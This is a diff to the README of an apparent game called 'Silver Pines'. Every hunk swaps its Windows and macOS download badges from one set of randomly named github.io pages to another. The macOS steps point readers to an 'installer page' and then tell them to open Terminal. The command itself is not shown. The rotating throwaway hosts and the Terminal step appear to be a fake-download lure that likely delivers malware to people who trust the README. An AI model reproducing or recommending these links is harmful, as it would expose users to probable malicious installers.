@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Download Silver Pines](https://img.shields.io/badge/⬇_Download_Silver%20Pines-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
+[![⬇ Download Silver Pines](https://img.shields.io/badge/⬇_Download_Silver%20Pines-E63946?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
 
 </div>
 
@@ -65,9 +65,9 @@ Silver Pines is a cozy life simulation set in a small mountain town where you re
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://mixedlinkrelease.github.io/installer/)
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
 
 </div>
 
@@ -85,7 +85,7 @@ Silver Pines is a cozy life simulation set in a small mountain town where you re
 
 <div align="center">
 
-[![⬇ Download Silver Pines](https://img.shields.io/badge/⬇_Download_Silver%20Pines-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
+[![⬇ Download Silver Pines](https://img.shields.io/badge/⬇_Download_Silver%20Pines-E63946?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
 
 </div>
 
@@ -117,7 +117,7 @@ Silver Pines is a cozy life simulation set in a small mountain town where you re
 
 ## 🍎 macOS Installation
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -142,7 +142,7 @@ Silver Pines is a cozy life simulation set in a small mountain town where you re
 
 <div align="center">
 
-[![⬇ Download Silver Pines](https://img.shields.io/badge/⬇_Download_Silver%20Pines-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
+[![⬇ Download Silver Pines](https://img.shields.io/badge/⬇_Download_Silver%20Pines-E63946?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
 
 </div>
 
